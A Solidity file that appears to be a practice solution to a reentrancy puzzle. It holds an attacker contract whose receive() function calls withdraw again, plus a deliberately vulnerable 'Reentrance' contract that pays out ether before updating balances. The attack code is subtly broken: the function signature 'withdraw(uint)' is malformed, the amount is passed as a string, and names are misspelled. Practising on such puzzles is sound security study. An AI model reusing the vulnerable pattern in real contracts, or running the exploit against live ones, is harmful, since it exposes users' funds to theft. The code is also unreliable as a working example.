// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
import "hardhat/console.sol";

contract Rentry {
    bool public triggered;

    address  player = 0x7fE004aede7060De3Cc31f63510B576F45Ef158b;
    address  owner = 0x9F72CAc495b96de313EA6672e046f99b7e2db925;
    bytes public caller;

    function trigger(address _instance, string memory name, string memory parameter) public {
        // Start withdrawals
        caller = abi.encodeWithSignature(name, parameter);
        (bool result,) = _instance.call(caller);
        triggered = result;
    }

    function delt(address _instance, string memory name, string memory parameter, uint val) public {
        // Start withdrawals
        caller = abi.encodeWithSignature(name, parameter);
        (bool result,) = _instance.delegatecall(caller);
        triggered = result;
    }

    function destory() public {
        if (msg.sender == owner) {
            selfdestruct(payable(player));
        }
    }

    receive() external payable {
        console.log("Rentry got money");
        (bool result,) = address(msg.sender).call(abi.encodeWithSignature("withdraw(uint)", "0.001"));
        result;

    }

}

contract Reentrance {
  
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        uint256 val = msg.value;
        balances[_to] += msg.value;
        console.log("DOnate called val : %s", val);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        console.log("blanace c aallled");
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        console.log("withdraw called");
        if(balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value:_amount}("");
            if(result) {
            _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}